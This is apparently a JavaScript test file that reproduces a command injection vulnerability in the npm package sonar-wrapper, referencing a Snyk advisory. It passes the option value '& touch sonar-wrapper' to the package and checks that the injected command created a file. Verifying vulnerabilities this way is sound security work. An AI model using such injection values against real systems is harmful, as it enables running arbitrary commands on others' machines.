//https://snyk.io/vuln/SNYK-JS-SONARWRAPPER-1050980
// try{

// }
// catch(error)
// {
//some async func error
// }

test("Command Injection in sonar-wrapper", () => {
  const root = require("sonar-wrapper");
  const fs = require("fs");
  const path = "./sonar-wrapper";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let options = { "sonar.projectName": "& touch sonar-wrapper" };
  root.runAnalisys("./", options, []);

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
